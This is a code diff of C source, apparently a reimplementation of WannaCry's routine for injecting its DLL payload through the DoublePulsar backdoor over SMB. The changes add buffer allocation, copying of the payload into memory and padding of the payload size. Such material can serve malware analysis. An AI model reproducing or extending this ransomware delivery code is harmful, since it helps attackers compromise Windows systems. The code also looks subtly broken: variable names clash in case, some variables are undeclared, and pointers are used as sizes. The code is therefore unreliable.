@@ -23,7 +23,6 @@ int encodePacket(unsigned int xor_key, char *buf, int size)
 	return 0;
 }
 
-
 int iterations = TotalSizeOfPayload / 4096;
 int remainder = TotalSizeOfPayload % 4096;
 int v28;
@@ -41,6 +40,7 @@ unsigned char signature[12]; //dunno why Wannacry lists this variable with 9
 char *hMem;
 char *payload;
 const void *payload_exe_buffer;
+signed int SizeOfShellcode;
 
 int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
 {
@@ -57,9 +57,15 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 	    sizeOfshellcode = 6144;
 	    payload = (char *)&DLLPayload64;
 	  }
-	  hMem = GlobalAlloc(GPTR, (SIZE_T)&payload[sizeOfshellcode + 12]);
-	
-	
+	hMem = GlobalAlloc(GPTR, (SIZE_T)&payload[sizeOfshellcode + 12]);
+	qmemcpy((char *)hMem + SizeOfShellcode, payload_exe_buffer, (unsigned int)payload);
+	 if ( (signed int)&payload[sizeOfshellcode] % 4 )
+    	{
+      		TotalSizeOfPayload = 4 * ((signed int)&v5[v4] / 4) + 4;
+	 }
+	else {
+		TotalSizeOfPayload = (int)&payload[sizeOfshellcode];
+	}
 	
 	if ( TotalSizeOfPayload / 4096 > 0 )
 	    {
